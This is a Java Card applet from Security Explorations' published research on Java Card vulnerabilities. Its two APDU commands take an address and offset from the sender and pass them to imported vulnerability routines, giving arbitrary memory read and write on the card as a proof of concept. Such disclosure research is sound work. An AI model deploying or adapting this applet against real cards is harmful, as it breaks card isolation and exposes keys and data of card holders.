/*## (c) SECURITY EXPLORATIONS    2019 poland                                #*/
/*##     http://www.security-explorations.com                                #*/

/* RESEARCH MATERIAL:	SE-2019-01                                            */
/* Security vulnerabilities in Java Card                                      */

/* THIS SOFTWARE IS PROTECTED BY DOMESTIC AND INTERNATIONAL COPYRIGHT LAWS    */
/* UNAUTHORISED COPYING OF THIS SOFTWARE IN EITHER SOURCE OR BINARY FORM IS   */
/* EXPRESSLY FORBIDDEN. ANY USE, INCLUDING THE REPRODUCTION, MODIFICATION,    */
/* DISTRIBUTION, TRANSMISSION, RE-PUBLICATION, STORAGE OR DISPLAY OF ANY      */
/* PART OF THE SOFTWARE, FOR COMMERCIAL OR ANY OTHER PURPOSES REQUIRES A      */
/* VALID LICENSE FROM THE COPYRIGHT HOLDER.                                   */

/* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS    */
/* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,*/
/* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    */
/* SECURITY EXPLORATIONS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, */
/* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF  */
/* OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE     */
/* SOFTWARE.                                                                  */

package com.se.applets;

import javacard.framework.*;
import com.se.vulns.*;

public class SEApplet extends Applet {
    private final static byte SEApplet_CLA      = (byte)0x80;

    private final static byte NREAD_SHORT       = (byte)0x10;
    private final static byte NWRITE_SHORT      = (byte)0x11;

    protected SEApplet() {       
      register();
    }

    public static void install(byte[] bArray, short bOffset, byte bLength) {
      new SEApplet();
    }

    public byte[] get_req(APDU apdu,short size) {
      byte[] buffer=apdu.getBuffer();

      byte numBytes=buffer[ISO7816.OFFSET_LC];
      byte byteRead=(byte)(apdu.setIncomingAndReceive());

      if ((numBytes!=size)||(byteRead!=size)) {
        ISOException.throwIt(ISO7816.SW_WRONG_LENGTH);
      }

      return buffer;
    }

    public void send_resp(APDU apdu,short size) {
      short availBytes=apdu.setOutgoing();

      if (availBytes<size) {
       ISOException.throwIt(ISO7816.SW_WRONG_LENGTH);
      }

      apdu.setOutgoingLength((byte)size);
      apdu.sendBytes((short)5,(short)size);
    }

    public void nread_short(APDU apdu) {
     byte buf[]=get_req(apdu,(short)6);

     int addr=(((int)buf[ISO7816.OFFSET_CDATA+0])&0xff)<<(int)24;
     addr|=(((int)buf[ISO7816.OFFSET_CDATA+1])&0xff)<<(int)16;
     addr|=(((int)buf[ISO7816.OFFSET_CDATA+2])&0xff)<<(int)8;
     addr|=(((int)buf[ISO7816.OFFSET_CDATA+3])&0xff);

     short off=(short)((((short)buf[ISO7816.OFFSET_CDATA+4])&0xff)<<(short)8);
     off|=(((short)buf[ISO7816.OFFSET_CDATA+5])&0xff);

     short dummy=Test.readShort(addr,off);

     buf[(short)(ISO7816.OFFSET_CDATA+0)]=(byte)((dummy>>8)&0xff);
     buf[(short)(ISO7816.OFFSET_CDATA+1)]=(byte)(dummy&0xff);

     send_resp(apdu,(short)2);
    }

    public void nwrite_short(APDU apdu) {
     byte buf[]=get_req(apdu,(short)8);

     int addr=(((int)buf[ISO7816.OFFSET_CDATA+0])&0xff)<<(int)24;
     addr|=(((int)buf[ISO7816.OFFSET_CDATA+1])&0xff)<<(int)16;
     addr|=(((int)buf[ISO7816.OFFSET_CDATA+2])&0xff)<<(int)8;
     addr|=(((int)buf[ISO7816.OFFSET_CDATA+3])&0xff);

     short off=(short)((((short)buf[ISO7816.OFFSET_CDATA+4])&0xff)<<(short)8);
     off|=(((short)buf[ISO7816.OFFSET_CDATA+5])&0xff);

     short val=(short)((((short)buf[ISO7816.OFFSET_CDATA+6])&0xff)<<(short)8);
     val|=(((short)buf[ISO7816.OFFSET_CDATA+7])&0xff);

     Test.writeShort(addr,off,val);

     short dummy=Test.readShort(addr,off);

     buf[(short)(ISO7816.OFFSET_CDATA+0)]=(byte)((dummy>>8)&0xff);
     buf[(short)(ISO7816.OFFSET_CDATA+1)]=(byte)(dummy&0xff);

     send_resp(apdu,(short)2);
    }

    public void process(APDU apdu) {
      byte[] buffer=apdu.getBuffer();

      if (buffer[ISO7816.OFFSET_CLA]!=SEApplet_CLA) {
       ISOException.throwIt(ISO7816.SW_CLA_NOT_SUPPORTED);
      }

      switch (buffer[ISO7816.OFFSET_INS]) {
        case NREAD_SHORT:
         nread_short(apdu);
         return;
        case NWRITE_SHORT:
         nwrite_short(apdu);
         return;
        default:
         ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
      }
    }
}

